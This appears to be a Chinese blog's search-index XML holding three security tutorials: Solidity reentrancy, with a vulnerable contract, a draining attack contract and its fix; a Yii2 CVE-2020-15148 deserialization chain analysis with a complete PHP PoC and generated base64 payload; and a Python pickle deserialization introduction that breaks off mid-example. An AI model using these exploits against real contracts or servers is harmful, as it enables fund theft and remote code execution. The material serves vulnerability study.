<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BlockChain solidity 重入漏洞分析</title>
    <link href="/2022/09/29/BlockChain-solidity-%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/09/29/BlockChain-solidity-%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>solidity智能合约的转账主要通过send,transfer,call等函数实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>msg.sender.transfer(msg.value)<br><br>msg.sender.send(msg.value)<br><br>msg.sender.call&#123;value: msg.value&#125;()<br><br></code></pre></td></tr></table></figure><p>三者的主要区别在于:</p><ol><li>send transfer均有2300的最大gas消耗限制,如果一次操作消耗的gas大于2300,则操作失败。call方法执行则没有gas消耗限制</li><li>transfer函数执行在失败后会回滚状态并终止后续步骤执行,而send和call函数则在失败时返回false,并不结束后续操作</li><li>call函数在调用后会执行调用者的fallback函数,并将所有可用gas交给fallback函数使用</li><li>transfer和send均为call函数的封装</li></ol><p>总结下来看transfer在使用时最为安全（失败时会抛出异常并执行回滚操作）,而send和call在使用时需要通过返回值的true&#x2F;false来判断转账操作是否执行成功</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>由于call函数没有2300gas的限制,导致在fallback函数中可以执行非常复杂的操作,包括再次向目标合约发起执行call操作的函数请求再次发起转账（由于gas不限制,因此可以执行复杂逻辑比如转账）。简单demo如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>contract A &#123;<br>    function withdraw() public &#123;<br>        (bool sent,) = msg.sender.call&#123;value:1 ether&#125;;<br>        require(sent, &quot;Failed to send Ether&quot;);<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    A public a;<br>    constructor(address AddressOfContract_A) &#123;<br>        a = A(AddressOfContract_A);<br>    &#125;<br><br>    fallback() external payable &#123;<br>        a.withdraw(); <br>    &#125;<br><br>    function attack() external payable &#123;<br>        A.withdraw()<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到当合约B调用attack函数时 会调用合约A的withdraw函数,withdraw会调用call方法向调用方(在这里也就是B的合约地址)转账。<br>在call函数转账成功后,会调用B合约的fallback函数。可以看到fallback函数中再次调用了A合约的withdraw方法,也就是说再次调用了call函数进行转账。而在这次call函数调用成功后,又回再次跳到B合约的fallback函数执行,在这次fallback中又会再次调用A合约的withdraw函数进行转账……<br>由此形成类似递归调用的逻辑,最终B函数通过一次withdraw调用可以把A合约中所有的ether转移走。这也就是重入漏洞的成因了。</p><h2 id="再进一步"><a href="#再进一步" class="headerlink" title="再进一步"></a>再进一步</h2><p>看如下合约代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract EtherStore &#123;<br>    mapping(address =&gt; uint) public balances;<br><br>    // 向银行合约地址中存入ether<br>    function deposit() public payable &#123;<br>        balances[msg.sender] += msg.value;<br>    &#125;<br><br>    // 从银行中取出所存的所有ether<br>    function withdraw() public &#123;<br>        uint bal = balances[msg.sender];                    //获取msg.sender在合约中的所有ether数量<br>        require(bal &gt; 0);                                   //需要存钱数量大于0才能进行取款操作<br><br>        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);     //调用call方法将ether取出<br>        require(sent, &quot;Failed to send Ether&quot;);              //判断call执行是否成功<br><br>        balances[msg.sender] = 0;                           //取钱成功后,将msg.sender存钱金额记录为0（因为ether已经通过call全部取出了<br>    &#125;<br><br>    function getBalance() public view returns (uint) &#123;<br>        return address(this).balance;                       // 获取该合约中的所有ether数量<br>    &#125;<br><br>    fallback() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码可以看出这是一个类似银行存储的合约,用户可以通过deposit函数存一定数量的ether,可以通过withdraw函数取走所有存储的ether。<br>可以看到:</p><ul><li>在执行call操作之前,代码逻辑判断可当前账户存款数是否大于0 大于0时才会有提取逻辑</li><li>执行完call操作转账后后,通过balances[msg.sender] &#x3D; 0设置存储金额为0</li></ul><p>思路是在转账完成后将存款金额置0,这样即使通过重入攻击再次调用withdraw函数,也会因为无法绕过判断require(bal &gt; 0)而无法操作。然而事实上并不是这样。在我们理解了call和重入漏洞之后可以知道,fallback函数的调用是在call函数调用完成之后立即进行的,也就是其调用时间是早于balances[msg.sender] &#x3D; 0这一行代码执行的,因为当通过fallback函数再次调用withdraw时,balances[msg.sender]并不等于0,因此require(bal &gt; 0)判断条件成立,再次执行call操作再次转账。简单来讲 函数的执行逻辑并不像开发者所想的那样是:</p><p>attack -&gt; withdraw -&gt; call -&gt; balances[msg.sender] &#x3D; 0 -&gt; fallback -&gt; withdraw -&gt; require(bal &gt; 0)失败 调用链结束</p><p>而是:</p><p>attack -&gt; withdraw -&gt; call -&gt; fallback -&gt; withdraw -&gt; fallback -&gt; withdraw -&gt; …… -&gt; address(this).balance &#x3D; 0 call无法转账 -&gt; balances[msg.sender] &#x3D; 0</p><p>也就是说,重入攻击仍然可以进行。我们可以写出如下攻击合约:通过调用attack函数即可完成攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    EtherStore public etherStore;<br><br>    constructor(address payable _etherStoreAddress) &#123;<br>        etherStore = EtherStore(_etherStoreAddress);<br>    &#125;<br>    fallback() external payable &#123;<br>        if (address(etherStore).balance &gt;= 1 ether) &#123;<br>            etherStore.withdraw();<br>        &#125;<br>    &#125;<br>    function attack() external payable &#123;<br>        <br>        etherStore.deposit&#123;value: 1 ether&#125;();<br>        etherStore.withdraw();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>方便调试,笔者已经将两个合约都部署到了Rinkeby测试网络中便于各位调试,合于地址分别为:<br>EtherStore: 0xe732C451cFaF6e03B4189B64A18310A60758635B<br>Attack: 0x380b184C3C5F20C2f5b58fD54B543c68A4B3dB78</p><p>在理解了这段代码之后,也就很好知道如何修复这个问题了,我们只需要将 balances[msg.sender] &#x3D; 0; 这行代码移到call调用之前执行即可,这样一来在第一次调用withdraw时,会先将balances[msg.sender]置为0在进行call转账操作。那么当转账成功后fallback再次调用withdraw时,balances[msg.sender]就已经为0了。此时require(bal &gt; 0)判断无法绕过也就不会再次进行转账了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw() public &#123;<br>        uint bal = balances[msg.sender];                    //获取msg.sender在合约中的所有ether数量<br>        require(bal &gt; 0);                                   //需要存钱数量大于0才能进行取款操作<br><br>        balances[msg.sender] = 0;                           //先将msg.sender存钱金额记录为0,在执行call进行转账<br><br>        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);     //调用call方法将ether取出<br>        require(sent, &quot;Failed to send Ether&quot;);              //判断call执行是否成功<br>    &#125;<br></code></pre></td></tr></table></figure><p>除了上述的解决方案之外,solidity本身也提供了一些方案用于解决重入攻击:</p><ol><li>在使用call函数进行转账时,可以通过call.value{gas:2300} 进行gas消耗限制(这种做法不被推荐,笔者也没详究原因)</li><li>使用OpenZeppelin提供的nonReentrant修饰符对转账函数进行修饰。相当于对被调用函数加互斥锁防止其被重复调用。</li></ol><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1]<a href="https://solidity-by-example.org/fallback/">https://solidity-by-example.org/fallback/</a><br>[2]<a href="https://solidity-by-example.org/call/">https://solidity-by-example.org/call/</a><br>[3]<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard-nonReentrant--">https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard-nonReentrant--</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>solitidy</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yii2 CVE-2020-15148 链分析 Part 1</title>
    <link href="/2022/09/23/Yii2-CVE-2020-15148-%E9%93%BE%E5%88%86%E6%9E%90-Part-1/"/>
    <url>/2022/09/23/Yii2-CVE-2020-15148-%E9%93%BE%E5%88%86%E6%9E%90-Part-1/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>漏洞影响版本&lt;2.0.38,这里用37版本进行分析复现</p><p>在源码 basic&#x2F;controllers目录下新建 PocController.php作为漏洞触发入口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">contraollers</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PocController</span> <span class="hljs-keyword">extends</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-comment">// 接收payload</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionPoc</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>链入口位于vender\yiisoft\yii2\db\BatchQueryResult.php 类BatchQueryResult</p><p>发现其__destruct() 方法,该方法会调用 reset()方法, 在reset()方法中又执行了代码 $this-&gt;_dataReader-&gt;close()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;_dataReader !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_dataReader-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;_dataReader = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;_batch = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;_value = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;_key = <span class="hljs-literal">null</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此时就有两种方法可以使pop链继续:</p><ol><li>$this-&gt;_dataReader是一个不存在close方法的类,调用不存在的类触发类中__call方法</li><li>$this-&gt;_dataReader是一个存在close方法的类,其close方法重的代码存在继续rce链的可能</li></ol><p>这次使用思路1尝试构造pop链,全局搜索可利用的__call方法。可以发现在vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;Generator.php中的类Generator存在可以利用的__call方法,该方法会调用类的format方法.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> string $method</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> array $attributes</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">format</span>(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span>, <span class="hljs-variable">$arguments</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFormatter</span>(<span class="hljs-variable">$formatter</span>), <span class="hljs-variable">$arguments</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>format方法中发现了调用call_user_func_array函数,离rce更进一步。结合getFormatter方法的代码我们可以分析出来,只要类Generator的formatters变量中存在 formatters[‘close’] 即可以通过call_user_func_array(formatters[‘close’], $arguments)调用任意类的任意方法，调用方法只需要设置</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">class</span> <span class="hljs-symbol">name, <span class="hljs-symbol">function</span></span> <span class="hljs-symbol">name</span>]<br></code></pre></td></tr></table></figure><p>因此，我们只需要找到一个可以执行任意命令的类和方法，并且命令执行方法的参数可控即可。无论是eval,assert还是call_user_func均可。很快可以找到在vendor&#x2F;yiisoft&#x2F;yii2&#x2F;rest&#x2F;IndexAction.php和vendor&#x2F;yiisoft&#x2F;yii2&#x2F;rest&#x2F;CreateAction.php中,类IndexAction与CreateAction均存在一个run()方法,方法中调用了call_user_func且参数可控。到这里完整的pop链就完成了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;checkAccess) &#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;checkAccess, <span class="hljs-variable">$this</span>-&gt;id);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepareDataProvider</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>整个链为:<br>BatchQueryResult-&gt;__destrcut &#x3D;&gt; BatchQueryResult-&gt;reset &#x3D;&gt; Generator-&gt;__call &#x3D;&gt; Generator-&gt;format &#x3D;&gt; call_user_func_array &#x3D;&gt; IndexAction-&gt;run &#x3D;&gt; call_user_func</p><p>poc如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">IndexAction</span>&#123;<br>        <span class="hljs-title class_">public</span> $<span class="hljs-title class_">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;1&#x27;</span>; <span class="hljs-comment">// rce</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>\<span class="hljs-title class_">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123; <br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexAction</span>(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">Generator</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">BatchQueryResult</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BatchQueryResult</span>()));<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ php controllers/poc4.php                                                            130 ⨯<br>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtzOjE6IjEiO31pOjE7czozOiJydW4iO319fX0=<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中的反序列化安全问题</title>
    <link href="/2020/06/16/Python%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2020/06/16/Python%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>最近在研究反序列化的问题。打算把python，PHP，Java中的反序列化漏洞都说一说。python的最好理解，权当抛砖引玉。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>我们知道，在Java和PHP中都实现了对象的序列化和反序列化能力。而在python中，其实也有类似的实现。</p><p>在python中,序列化用于将存在于内存中的对象或变量转化成二进制的字节流.这样可以将类对象的状态和属性保存下来。在需要用到的时候再对其进行反序列化成对象。</p><p>官方库中，主要提供了三个模块用于序列化实现：pickle（cpickle）,marshal,json</p><p>其中json模块应该是最为人所知的，它主要提供python字典，列表等数据类型和字符串之间互相转换的能力；</p><p>而marshal和pickle模块则可以对python中的类和对象进行序列化和反序列化。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>简单介绍一下pickle模块的用法。</p><p>在pickle中，序列化的接口常用的有两个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pickle.dump(obj,file)<br><br>pickle.dumps(obj)<br></code></pre></td></tr></table></figure><p>前者必要参数是进行序列化的对象和一个文件对象，序列化的内容将被保存至文件中。后者仅需要提供对，序列化的二进制数据将会作为返回；</p><p>相对应，反序列化也有两个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pickle.load(file)<br><br>pickle.loads(stream)<br></code></pre></td></tr></table></figure><p>分别可以从文件或字节流中反序列化出对象。举个例子来看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name = name<br>        self.age = age<br><br><span class="hljs-comment"># 构造SerializePerson类的一个对象</span><br>person = SerializePerson(<span class="hljs-string">&#x27;tom&#x27;</span>,<span class="hljs-number">18</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name: &quot;</span> + person.name)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;age: &quot;</span> + <span class="hljs-built_in">str</span>(person.age))<br><br><span class="hljs-comment"># 将这个实例序列化</span><br><br>objectoutputstream = pickle.dumps(person) <span class="hljs-comment"># 序列化到输出</span><br><span class="hljs-built_in">print</span>(objectoutputstream)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tmp.bin&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f: pickle.dump(person,f)<br>os.system(<span class="hljs-string">&quot;xxd tmp.bin&quot;</span>) <span class="hljs-comment"># 序列化到文件并查看</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span>*<span class="hljs-number">50</span>) <span class="hljs-comment"># 分割线 以下是反序列化</span><br><br>personobject = pickle.loads(objectoutputstream) <span class="hljs-comment"># 将二进制串反序列化成对象</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name: &quot;</span> + personobject.name)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;age: &quot;</span> + <span class="hljs-built_in">str</span>(personobject.age))<br></code></pre></td></tr></table></figure><p>代码首先定义一个 SerializePerson 类，类包含两个属性：name和age。</p><p>我们实例化了一个对象 person 同时使用构造函数__init__ 对变量赋值。</p><p>之后对person 对象，分别通过pickle.dump 和 pickle.load 做序列化和反序列化。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>我们都知道，Java中的反序列化漏洞主要在于反序列化时会调用对象的readObject方法，在PHP中则有更多的魔术方法可能在反序列化或toString等情况下调用。</p><p>而在python中，同样的有几个内置方法，会在对象被反序列化时调用。他们分别是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">__reduce__()  <br>__reduce_ex__() <br>__setstate__()<br></code></pre></td></tr></table></figure><p>关于这三个方法的具体的用法可以参考官方文档中的描述：</p><p><a href="https://link.zhihu.com/?target=https://docs.python.org/zh-cn/dev/library/pickle.html%23object.__setstate__">pickle — Python 对象序列化</a></p><p>参考PHP的反序列化。如果我们可以在类中构造这些方法，并在方法中执行恶意代码。那么实例在反序列化时就会执行我们的代码了。</p><p>更加尴尬的是，python并没有对pickle模块做任何安全性的限制：他没有验证反序列化的类是否在应用中注册，也没有类似Java中SerializeUID的存在。这也就导致了，攻击者任意构造的对象都会被实现了pickle.load的接口进行反序列化并执行Magic function。</p><p>可以使用一个简单的 poc 来验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span>():<br>    <span class="hljs-keyword">def</span> 